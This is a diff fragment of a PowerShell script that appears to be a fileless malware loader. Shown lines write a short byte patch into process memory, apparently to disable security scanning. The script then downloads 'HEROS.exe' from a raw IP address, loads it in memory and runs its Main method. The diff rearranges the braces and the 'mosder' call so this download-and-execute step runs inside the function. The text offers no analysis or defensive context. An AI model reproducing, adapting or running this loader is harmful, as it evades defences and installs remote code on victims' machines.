@@ -27,9 +27,11 @@ $XVON = "0x80"
 $WRUD = "0xC3"
 $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
-}
-mosder
 
 $data = (New-Object System.Net.WebClient).DownloadData('http://3.8.126.182/HEROS.exe')
 $assem = [System.Reflection.Assembly]::Load($data)
 [Client.Program]::Main("".Split())
+}
+mosder
+
+
